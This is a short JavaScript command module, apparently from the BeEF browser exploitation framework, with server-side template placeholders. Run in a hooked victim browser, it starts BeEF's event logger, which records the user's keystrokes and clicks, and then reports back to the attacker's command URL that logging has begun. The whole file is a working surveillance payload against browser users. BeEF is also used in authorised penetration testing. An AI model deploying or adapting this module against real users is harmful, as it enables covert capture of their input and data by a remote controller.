beef.execute(function() {
	beef.logger.start();
	beef.net.sendback("<%= @command_url %>", <%= @command_id %>, 'result=Event logger has been started');
});

